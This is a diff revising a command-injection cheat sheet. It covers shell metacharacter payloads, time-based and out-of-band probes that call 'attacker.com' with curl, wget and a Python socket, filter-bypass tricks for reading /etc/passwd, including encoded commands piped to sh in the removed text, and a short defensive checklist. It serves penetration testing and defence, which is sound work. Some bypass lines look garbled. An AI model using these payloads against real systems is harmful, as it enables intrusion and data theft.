@@ -1,129 +1,71 @@
-# Command Injection: Complete Reference
+# Command Injection: 2026 Complete Reference
 
-## Detection
+## Shell Metacharacters
 
-### Basic OS Command Injection
+### Linux
 ```bash
-# Linux
 ; id
 | id
-`id`
-$(id)
 || id
+& id
 && id
+$(id)
+`id`
+%0a id        # Newline encoding
+```
 
-# Windows
+### Windows
+```cmd
 | dir
 || dir
 & dir
 && dir
+%0a dir
 ```
 
-### Time-Based Detection
-```bash
-# Linux
-| sleep 5
-|| sleep 10
-$(sleep 5)
-`sleep 5`
+## Blind Detection
 
-# Windows
+### Time-Based
+```bash
+; sleep 5
 | ping -n 5 127.0.0.1
-|| timeout 5
+& ping -c 5 127.0.0.1
 ```
 
-### Out-of-Band Detection
+### Out-of-Band
 ```bash
-# DNS/HTTP callback
-| curl http://COLLABORATOR.oastify.com
-|| nslookup COLLABORATOR.oastify.com
-$(wget http://COLLABORATOR.oastify.com)
+; nslookup attacker.com
+| curl http://attacker.com/test
+& wget http://attacker.com/payload
+; python -c 'import socket;s=socket.socket();s.connect(("attacker.com",80))'
 ```
 
-## Exploitation
+## Filter Bypass
 
-### Bypass Techniques
-
-#### Space Filter Bypass
-```bash
-# Tabs instead of spaces
-cat%09/etc/passwd
-
-# IFS (Internal Field Separator)
-cat${IFS}/etc/passwd
-
-# Brace expansion
-{cat,/etc/passwd}
-```
-
-#### Keyword Filter Bypass
+### Character Obfuscation
 ```bash
 # Quoting
-c''at /etc/p''asswd
-c""at /etc/p""asswd
-c\at /etc/p\asswd
-
-# Base64 encoding
-echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
-
-# Hex encoding
-echo '636174202f6574632f706173737764' | xxd -r -p | sh
-
-# Case variation
-CaT /eTc/PaSsWd
-```
-
-#### Character Filter Bypass
-```bash
-# $() for char generation
-$(printf "\x63\x61\x74") /etc/passwd
-
+'/bin/sl'eep' 5'    # Mix quotes
+# Environment variables
+$0: ${0:-/bin/bash}
+$IFS: /bin${IFS}cat${IFS}/etc/passwd
 # Wildcard
-/???/c?t /???/p?ss??
-
-# Environment variable manipulation
-$SHELL
-$PATH
+/???/c?t /etc/passwd
 ```
 
-## Frameworks
-
-### Node.js
-```javascript
-// Unsafe exec
-require('child_process').exec('ls ' + input, callback)
-
-// Safe: execFile
-require('child_process').execFile('ls', ['-la'], callback)
+### Newline Injection
+```bash
+# %0a (URL encoded newline) often splits commands
+cmd=%0acat%20/etc/passwd%0a
 ```
 
-### Python
-```python
-# Unsafe
-os.system(f"ls {input}")
-subprocess.call(f"ls {input}", shell=True)
+## Tooling
+- **commix**: Automated command injection detection and exploitation
+- **Burp Intruder**: Fuzz parameter values with metacharacter prefixes
 
-# Safe
-subprocess.call(["ls", input])
-```
-
-### PHP
-```php
-// Unsafe
-system($input);
-exec($input);
-shell_exec($input);
-passthru($input);
-popen($input, "r");
-
-// Safe
-escapeshellcmd($input);  // Still risky
-escapeshellarg($input);  // Better
-```
-
-## CVSS Scoring
-| Scenario | CVSS | Criteria |
-|----------|------|---------|
-| OS command injection -> RCE | 9.8 | Network, Low, No auth, Full impact |
-| Blind command injection (time-based) | 7.5 | Network, Low, No auth, Changed scope |
-| Command injection with filter bypass | 9.1 | Network, Low, No auth, Full impact |
+## Defensive Checklist
+1. Never pass user input to shell functions (`os.system`, `subprocess.Popen(shell=True)`, `exec`, `system`)
+2. Use parameterized APIs (`subprocess.Popen([cmd, arg])` without `shell=True`)
+3. Whitelist allowed commands and parameters
+4. Validate and sanitize input: reject `;`, `|`, `&`, `` ` ``, `$()`
+5. Run application with least privilege (not root)
